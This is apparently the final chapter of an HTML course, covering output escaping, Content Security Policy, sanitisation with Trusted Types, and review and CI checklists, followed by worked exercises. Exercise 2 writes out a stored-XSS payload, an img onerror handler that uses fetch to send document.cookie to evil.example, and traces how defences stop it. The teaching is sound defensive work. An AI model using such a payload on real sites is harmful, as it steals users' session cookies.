Do not interpolate here at all. Pass data through a data-* attribute (§2.11) or a JSON block and read it from script.

Never build markup by concatenating strings. el.innerHTML = '<a href="' + url + '">' + name + '</a>' is what the bug looks like, and it can always be avoided: create the element, set textContent for the text and setAttribute for the attributes, and there is no parser involved to be tricked.

Client-side escaping is not the only escaping you need. §12.13's point applies unchanged: everything on the client is a convenience, and the server must escape on output whatever the browser did.

One vocabulary note: html injection is the general case, and cross-site scripting is the part of it where the injected markup runs code. html injection without script is still an attack: an injected <form> that posts to another site, or an injected link laid over your own, needs no JavaScript at all.

16.10 Content Security Policy

Escaping prevents injection. A content security policy limits the damage when injection happens anyway. It is a second line of defence, and the one that has actually held in real incidents.

CSP is a response header that lists where the page may load each kind of resource from, and which ways of running script are allowed.

Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-r4nd0mV4lu3';
  style-src 'self';
  img-src 'self' data: https://cdn.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self'

Each directive is a resource type and a list of allowed sources. 'self' is the document's own origin, 'none' is nothing, and a scheme or host may be named explicitly. default-src supplies the fallback for anything not stated.

Four directives do most of the work, and each closes a specific hole:

script-src is the point of the whole exercise. Without 'unsafe-inline', an injected <script> and an injected onerror attribute both fail to run, which is exactly the payload measured in §16.9. The nonce attribute (§2.10) is how your own inline scripts stay allowed: the server generates a fresh random value for each response, puts it in the header and on each legitimate <script nonce="…">, and an injected script cannot guess it. Note that the nonce must be per response and unguessable; a fixed nonce in a static file is worth nothing.

frame-ancestors controls who may frame you, which is §9.14's clickjacking defence, and it is the directive that cannot be delivered in a <meta http-equiv> (§3.6). In a meta tag it is silently ignored, so a policy written that way gives no framing protection at all while appearing to.

base-uri 'self' stops an injected <base> from pointing every relative URL on the page at an attacker's site (§3.4). It is a small directive that closes a genuinely nasty hole, and it is often left out.

form-action 'self' stops an injected form from sending the user's data somewhere else.

Two practical notes. Deploy in report-only mode first. Content-Security-Policy-Report-Only with a report-to endpoint enforces nothing and reports every violation, which on a real site is a long list of third-party scripts nobody remembered. And 'unsafe-inline' in script-src disables the protection entirely: a policy that includes it is documentation, not a defence, so the nonce approach is not optional if the policy is to mean anything.

16.11 Sanitisation and Trusted Types

Some applications really must accept HTML from users: a rich-text editor, a comment with formatting, a rendered email. Escaping is not an option there, because the markup is the point.

Sanitise with a library, never with a regular expression. To sanitize HTML correctly, you must parse it exactly as the browser will, walk the resulting tree, and remove everything not on an allowlist of elements, attributes and URL schemes. The attack surface is the entire parser, including every recovery rule in §1.8. A pattern-matching approach loses to <img src=x onerror=…>, to <svg><script>, to mutation attacks (markup that is safe until the cleaned string is parsed again), and to a dozen other shapes. DOMPurify is the well-tested option; the platform's own Element.setHTML() is arriving as a built-in.

Two rules for using one:

  • Allowlist, never blocklist. Name the elements and attributes you allow. A blocklist is a bet that you have thought of everything, against an attacker who only needs one gap.
  • Sanitise once, at a defined boundary, and keep track of which side of it each value is on. Sanitising on output every time is expensive, and invites the case where one code path forgets.

trusted types closes the remaining hole: any line of code anywhere can still assign a raw string to innerHTML. With the policy turned on, the dangerous sinks (innerHTML, outerHTML, document.write, <script>.src, eval) refuse plain strings and accept only objects produced by a policy you register:

Content-Security-Policy: require-trusted-types-for 'script'; trusted-types sanitizer

That turns "did anyone anywhere write an unsafe assignment?" from a code-review question into a guarantee enforced while the page runs, and it makes the sanitiser the single place markup can be created. It is the strongest answer available for an application that must handle user HTML.

16.12 The Review Checklist

Everything in this course, as the list to run through before shipping a page. It is grouped by which pass catches each item.

The parser (§16.2, §1.8)

  • The Elements panel's tree matches the source. No foster-parented content, no reconstructed formatting elements, no phantom empty <p>.
  • No duplicate id on the rendered page.

The validator (§16.4)

  • Zero errors, in CI, against the rendered output.
  • Every <img> has an alt decision. Every <iframe> has a title.
  • No invalid roles or aria-* attributes.

Structure (§6)

  • <html lang>, <meta charset> first, <meta name="viewport">.
  • A unique, specific <title>.
  • A skip link as the first focus stop, targeting <main id tabindex="-1">.
  • One <main>, one <h1>, no skipped heading levels.
  • Every <nav> past the first, and every <section>, has a name.

Content (§4, §5, §7, §8, §9, §10)

  • Link text says where it goes on its own.
  • alt is written for purpose, not description; decorative images have alt="".
  • width and height on every image, video, iframe and canvas.
  • Lists are lists; tables are tables with a <caption> and scope.
  • Media has captions; a transcript exists.

Forms (§11, §12)

  • Every control has a real <label>; a placeholder is not a label.
  • Errors are associated with their field and announced, not only coloured.
  • The server validates everything the client validated.

Keyboard and the tree (§13, §14, §16.6, §16.7)

  • Tab reaches every control, in the visual order, with a visible indicator throughout.
  • Nothing focusable is invisible; nothing visible is unreachable.
  • Every dialog traps focus, closes on Escape, and returns focus to its opener.
  • The accessibility tree has the landmarks, names, roles and states you expect.

Security (§16.9, §16.10, §9.12)

  • No unescaped interpolation; every innerHTML, |safe and dangerouslySetInnerHTML justified.
  • User-supplied HTML sanitised with a library, on an allowlist, at one boundary.
  • CSP with a per-response nonce, frame-ancestors, base-uri and form-action, sent as a header.
  • Untrusted embeds sandboxed, from a separate origin.

One entry deserves more detail, because it is the one most often skipped: every image needs a decorative image decision, made deliberately. A decorative image gets alt="" and leaves the tree; everything else gets text written for its purpose.

Exercises

1. A page passes the W3C validator with zero errors and a screen reader user cannot use it. Give six specific defects consistent with both facts, and say which pass would have caught each.

Solution

All six are valid markup, which is the point of §16.5: the validator checks grammar, not meaning.

1. No landmarks. The page is <div class="header">, <div class="content">, <div class="footer">. §6.1 measured that landmark roles come from the elements; a class produces a generic node. The user cannot jump to the content and must read past the header on every page. Caught by: the accessibility-tree pass (§16.6), question 1 — is there a main?

2. alt="image" on every image. Valid — the attribute is present, which is all the validator can check. §8.3: the alt should say what the image is for. Caught by: reading the AX tree and seeing image "image", or by the read-it-aloud test.

3. Headings jumping <h2> to <h4>. §6.2 measured level=4 after level=2 reported exactly as written. The user's heading list implies a missing section. Caught by: the heading list in the accessibility panel (§16.6, question 2).

4. <div onclick> instead of <button>. §7.2: no role, not focusable, no keyboard activation. Entirely valid markup. Caught by: the tab-order pass (§16.7) — the control is never reached.

5. role="presentation" on a data table. Valid ARIA on a valid table. §10.12 measured that it deletes the table, row and cell nodes, leaving a flat run of text. Caught by: the accessibility-tree pass (§16.6, question 4) — no table node where one was intended.

6. Every link reads "Read more". §7.10: a link's accessible name is its text, so the link list has twenty identical entries. Caught by: listing the links in the accessibility panel.

Two more that would also qualify: a focus indicator removed with outline: none (caught only by §16.7's keyboard walk), and a tab order that disagrees with the visual order because of CSS order (§14.4, same pass).

The general lesson: the validator is necessary and is the cheapest of the four passes, and every one of these defects is invisible to it. The passes are disjoint, so a green result on one says nothing about the others.

2. A profile page shows a user's display name. Someone sets theirs to <img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">. Trace what happens, and give three independent defences.

Solution

What happens depends entirely on how the name reaches the page.

If it is inserted with innerHTML or an unescaped template interpolation, §16.9's measurement applies exactly: the string is parsed, a real <img> element is created with a real onerror handler, the src of x fails immediately, and the handler runs — with no user interaction and no <script> tag anywhere, which is why filtering for the word "script" catches nothing.

The handler then runs with the page's origin. It can read document.cookie for every cookie not marked HttpOnly, send it to the attacker's server, read the whole DOM, read localStorage, and make authenticated requests as the victim. And because the display name is stored, this fires for every visitor to that profile — a stored XSS, which is the worst class.

If the name is inserted with textContent, none of it happens: the measurement shows the < and > escaped to &lt; and &gt;, and the page displays the characters the user typed.

Three independent defences, in order:

1. Escape on output. textContent, or a template engine's automatic escaping. This is the actual fix — it makes the string data rather than markup. The audit is to grep for the opt-outs (|safe, html_safe, dangerouslySetInnerHTML, v-html, innerHTML) and justify each. Note that escaping must be contextual: putting the same value in an attribute needs the quote character escaped and the attribute quoted (§2.2), and putting it in an href needs a scheme allowlist, because javascript: needs no angle brackets at all.

2. Content Security Policy (§16.10). script-src 'self' 'nonce-…' with no 'unsafe-inline' means the injected onerror attribute does not execute even if the escaping fails — inline event handlers are exactly what that directive blocks. This is the defence that holds when the first one has a gap, and it is why it is worth deploying even on a codebase you believe is clean. Add frame-ancestors, base-uri 'self' and form-action 'self' while you are there.

3. HttpOnly cookies. The payload targets document.cookie; an HttpOnly session cookie is not readable from script at all, so this specific exfiltration fails. It does not stop the attacker acting as the user from within the page, so it is a mitigation rather than a fix — but it is one header and it removes the most damaging outcome.

A fourth, if display names may genuinely contain formatting: sanitise with a library on an allowlist (§16.11), never with a regular expression, and enable trusted types so that no code path anywhere can assign a raw string to innerHTML.

And the ordering matters: defence 1 is the fix and defences 2 and 3 are the reason a single missed escape is not a breach.

3. Take the document in §16.1 and describe how you would put all four passes into a CI pipeline. Be specific about what fails the build and what only reports.

Solution

Pass 1 — the parser. Render each key route, serialise document.documentElement.outerHTML, and compare a canonicalised form of it against the source template's output. In practice the cheaper proxy is the validator, which reports the causes — a <div> in a <table>, an unclosed element — rather than the effects. Fails the build, because §16.2's defects are silent and unbounded in consequence.

Add one check the validator does not do: assert that no id appears twice in the rendered output. That is the generated-markup defect of §16.8 and it is a three-line script.

Pass 2 — the validator. The Nu HTML Checker, run locally as a container against the rendered HTML of a fixed list of routes, not against templates (§16.4). Fails the build on any error. Warnings go to the log. Keep an explicit, short, commented suppression list — an unexplained suppression is how a validator gate stops meaning anything.

Pass 3 — the accessibility tree. Two layers, and only one of them should fail a build.

  • Automated rule checks — an axe-style scan for missing names, missing labels, invalid ARIA, contrast. Fails the build, because these are unambiguous and have no false positives worth arguing about.
  • Tree snapshots — capture Accessibility.getFullAXTree for each route and commit it. A change in the tree then shows up as a diff in the pull request, which is exactly the right granularity: a landmark disappearing, a name going empty, a table becoming a LayoutTable (§10.10) are all one-line diffs a reviewer sees immediately. Reports, does not fail — the tree legitimately changes whenever the page does, so a hard failure would be ignored within a month.

Pass 4 — the tab order. Drive the browser, press Tab, record document.activeElement at each stop, and commit that as a snapshot too — this is precisely what check_ax.py's TAB ORDER mode does. Reports as a diff. Two assertions on top of it do fail the build, because they are absolutes: the first stop is the skip link, and every focused element has a non-none outline.

Security. Not a pass over the rendered page but a pair of gates: a lint rule failing on innerHTML, dangerouslySetInnerHTML, |safe and friends outside an allowlisted set of files, and an assertion that the response carries the expected Content-Security-Policy header with a nonce, frame-ancestors, base-uri and form-action. Both fail the build, since both are binary and neither has a legitimate reason to drift.

The design principle behind the split: a check with a single correct answer fails the build; a check whose output legitimately changes with the page produces a reviewable diff. Anything in the second category that fails the build gets disabled, and a disabled check is worse than none because it looks like coverage.

4. Explain why frame-ancestors in a <meta> tag is worse than having no clickjacking defence at all.

Solution

Because it produces the appearance of a defence and none of the effect, and the appearance is what stops anyone looking again.

The mechanism: frame-ancestors must be evaluated by the browser before the framed document renders — that is what "may this page be embedded here" means, and it is a decision about the response, made at the moment the response arrives. A <meta http-equiv> policy is discovered by the parser, which is already parsing the document, which means it has already been framed. So the specification explicitly forbids frame-ancestors, report-uri and sandbox in a meta-delivered CSP, and browsers ignore them there (§3.6, §9.14).

Why that is worse than nothing:

  • It is in the codebase, it looks correct, and a reviewer scanning for "do we have clickjacking protection" finds it and stops. A page with no defence at least fails the question honestly.
  • A security scan or a checklist item is satisfied by its presence.
  • Nothing warns. There is no console message, no validator error, no failed test — the directive is simply skipped while the rest of the meta CSP is enforced, so the policy demonstrably "works", which is the most misleading possible signal.

The threat it fails to stop is clickjacking (§9.14): the attacker loads your authenticated page in a transparent frame over a decoy, and the user's click on "Play video" lands on your "Delete account". Every part of the request is genuine — real session, real cookies, real browser, a real click by the real user — so nothing on the server can distinguish it, which is why the defence has to be enforced by the browser and cannot be anything the server-side application checks.

The fix is one response header:

Content-Security-Policy: frame-ancestors 'none'

'self' where the page must be embeddable by your own origin, or an explicit list of partner origins where it must be embeddable by them. Set it at the edge for everything, with an allowlist on the specific routes that are deliberately embeddable. X-Frame-Options: DENY may be sent alongside for very old user agents, though it cannot express an allowlist of more than one origin.

The general lesson, which is the reason this exercise exists: a control that silently does nothing is a distinct and worse category than a missing control. The same shape recurs — role="presentation" applied to silence a linter (§10.12), aria-hidden on a focusable element (§13.9), an alt attribute containing the word "image". Each satisfies the check and defeats its purpose, and the way to catch them is to verify the effect, which is what all four passes in this section are for.

5. You are handed a five-year-old page to modernise. Give your order of work and justify the sequencing.

Solution

The sequencing principle is: measure before changing, fix what is silent before what is visible, and do the structural work before the cosmetic work — because everything downstream depends on the structure.

Step 0 — capture the current state. Before touching anything: run the validator and save the output, capture the accessibility tree, record the tab order, screenshot the key breakpoints. Without a baseline you cannot tell a fix from a regression, and on a five-year-old page you will make both.

Step 1 — the head, and lang. <meta charset> first (§3.3), <meta name="viewport"> (§3.7), <html lang> (§2.12), a real <title> (§3.2). Delete X-UA-Compatible and <meta name="keywords">. This is minutes of work, cannot regress anything visual, and viewport alone may change how the page behaves on a phone — so do it first and look.

Remove user-scalable=no if it is there. It is a WCAG failure, and if it was there to stop iOS zooming on focused inputs the real fix is font-size: 16px on inputs.

Step 2 — the parser pass. Compare the Elements panel against the source and fix everything in §16.2's family: unclosed elements, mis-nested formatting, wrappers inside tables and lists. These are the silent defects, they are the ones the next steps will be built on, and a five-year-old hand-edited page usually has several.

Step 3 — landmarks and headings. Rename <div class="header"> to <header>, .content to <main id="main">, and so on (§6). The CSS classes can stay on the semantic elements, so the visual risk is near zero, and every landmark comes free (§6.1). Fix the heading ranks so the outline is real, and add the skip link.

This is the highest-value step by a distance, and it must come after step 2 because a mis-parsed tree makes the structural edits land in the wrong place.

Step 4 — controls and images. <div onclick> becomes <button> (§7.2); alt decisions on every image (§8.3); width and height on every image, iframe and video (§8.5); <label for> on every input (§11.2). Now run the validator and get it to zero, and put it in CI so it stays there.

Step 5 — the keyboard walk. §16.7's five questions, by hand. This is where the remaining defects are, because they are the ones no tool reported: the invisible focus indicator, the modal that does not trap focus or close on Escape, the hidden menu still in the tab order.

Step 6 — security. Audit every place user content reaches the page (§16.9), then deploy a CSP in report-only mode, read the violations for a week, and enforce (§16.10). Report-only first is not caution for its own sake — on a five-year-old page the violation list is the inventory of third-party scripts nobody remembers adding, and that inventory is worth having on its own.

Step 7 — the cosmetic and performance work, last, because it is the only part that can be judged by looking at the page, and because doing it first would mean doing it twice.

What I would not do: rewrite it. Every step above is a local, reviewable, reversible change to existing markup, and the sequencing is designed so that each one is independently shippable. A rewrite replaces a page with known defects with a page with unknown ones.

You started this course able to write HTML. You now understand what the browser does with it. That is the difference between markup that merely renders and markup you can be trusted with.

What you can now do

  1. Predict what the parser will build. A tag in your text is not yet an element, HTML has no parse errors that stop the page, and the way the browser recovers from mistakes is written into the standard. You can now explain foster parenting (stray content moved out of a table), implied end tags, reconstructed formatting elements and the empty <p> that appears from nowhere, instead of working around them.
  2. Choose elements by content model, not by appearance. The content model is the rule for what may go inside what: phrasing content, flow content, transparent content and permitted parents. It explains every case where the DOM disagrees with the source.
  3. Build a head that does its job. The encoding first, a viewport, a title that still makes sense when it is cut short, canonical and alternate links, resource hints that are worth their bandwidth, and a Content Security Policy that is sent as a header rather than left as a decoration.
  4. Write text-level markup that means something. <em> and <strong> produce nodes in the accessibility tree; <b> and <i> do not, and you know the narrow jobs each one still has.
  5. Structure a document twice over. A heading outline for reading, and a landmark structure for jumping around the page. They are separate structures, both are required, and CSS produces neither.
  6. Write links that work as links. A link takes you somewhere and a button does something. A link's name is everything inside it. And target="_blank" costs more than the rel attribute people add to it.
  7. Serve the right image bytes. alt written for the image's purpose, dimensions that stop the layout from jumping, srcset with sizes for resolution switching, <picture> for the choices only you can make, and the discipline never to lazy-load the largest visible image.
  8. Embed media and other documents safely. Captions, tracks and transcripts are three different obligations. sandbox is the only deny-by-default mechanism on the page (everything is forbidden until you allow it). And frame-ancestors is the protection that only works when sent as a header.
  9. Build tables that are tables. scope on every header, a caption on every table, and the knowledge that a table without either quietly stops being announced as one.
  10. Build forms that submit what you think they submit. The entry list, the submitter, the encodings, ValidityState, and a validation story that treats the browser's checks as a convenience, not a guarantee.
  11. Read the accessibility tree as the real output. Roles, names, states and the five rules of ARIA, plus the habit of checking the tree rather than trusting the markup.
  12. Manage focus deliberately. What is focusable, what tabindex does, why positive values affect the whole document, and what showModal() gives you for free.
  13. Use the component primitives. Templates, custom elements, shadow DOM, slots and form association, and the judgement to know when not to use them.
  14. Audit a document four ways. The parser, the validator, the accessibility tree and the keyboard. Each of the four passes catches defects the others cannot.
  15. Treat HTML as an execution boundary. Escape by default, escape for the context the text lands in, sanitise with a library that works from an allowlist, and layer a CSP underneath in case one of those was missed.

That is the whole markup layer of a production application. No part of a real page's HTML should now feel opaque to you.

When HTML surprises you

Almost every moment that stops an experienced developer comes from one of a handful of mechanisms, and you have seen each of them measured.

Symptom Where the answer is
"Why is my <div> outside the <p> I put it in?" §2.7 — <p> takes phrasing content only
"Why did my spinner appear above the table?" §10.4 — foster parenting
"Why does my second class attribute do nothing?" §2.2 — the first occurrence wins, silently
"Why does setAttribute('value', …) not change the field?" §2.3 — the dirty value flag
"Why is my checkbox checked when the flag is false?" §2.4 — boolean attributes ignore their value
"Why do my captions never appear?" §9.9 — an invalid kind falls back to metadata
"Why is my page 980 pixels wide on a phone?" §3.7 — no viewport meta
"Why does #top navigate away from the page?" §3.4 — <base> resolves fragments too
"Why is my table not announced as a table?" §10.10 — no caption and no headers means LayoutTable
"Why does Tab go somewhere I cannot see?" §14.4 — focus follows the DOM, not the screen
"Why did aria-hidden not remove the focus stop?" §13.9 — it changes one tree, not both
"Why does my custom element render empty?" §15.4 — render in connectedCallback
"Why does my clickjacking defence not work?" §9.14 — frame-ancestors cannot be a meta tag
"Why did that <img onerror> run?" §16.9 — innerHTML parses, textContent escapes

Habits worth keeping

Look at the tree, not the source. The Elements panel shows what the parser built. The Accessibility pane shows what a screen reader receives. Both are one keystroke away, and together they answer more questions than reading the markup again ever will. Every surprising result in this course came from looking.

Press Tab. It is the single most useful audit there is. It needs no tools, and it catches a kind of defect that no validator and no automated scan can see. Do it on every page you build, before anything else.

Say what the content is, then style it. The element is a claim about meaning; the CSS is a claim about appearance. Every defect in §16.5's list is the same mistake made in a different place: the heading used for its size, the <div> used as a button, the class used where a landmark belonged.

Prefer the element to the attribute. <button> over role="button", <nav> over role="navigation", <table> with scope over a grid of <div> elements with ARIA. The native element brings the role, the keyboard behaviour, the states and the platform conventions together, and keeps them in step. ARIA brings one of those and leaves the rest to you.

Escape on output, every time, in the right context. No amount of unescaped user input is safe. The four contexts (text, attribute, URL, script) need four different treatments. Then put a CSP underneath: the point of defence in depth is that it does not depend on you having been right.

Validate in CI, not by hand. A validator is only useful when it reports zero problems. Fix the page once, wire the validator into the build, and it stays fixed.

Where to go next

The natural next step is css_mastery. It owns everything this course deliberately left at the boundary: the visually-hidden technique behind §13.8, the focus indicators of §14.5, :host and ::slotted from §15.11, the layout that makes §10.13's wide table and §8.9's art direction work, and the reason display: none and visibility: hidden are not interchangeable.

After that:

  • js_mastery teaches the language behind the platform APIs you have already used: the DOM work of §14, the custom elements of §15, and FormData from §12.12.
  • websec_mastery develops §16.9 and §16.10 into the full picture of web security.
  • backend_and_api_design_mastery takes over where §12.3 stopped, with what a request method means to the server.

The habit that carries across all of them is the one this course was built on: make the claim, then measure it. Almost everything about a web page can be checked in the browser in front of you, and the things that surprise you when you check are the things worth knowing.
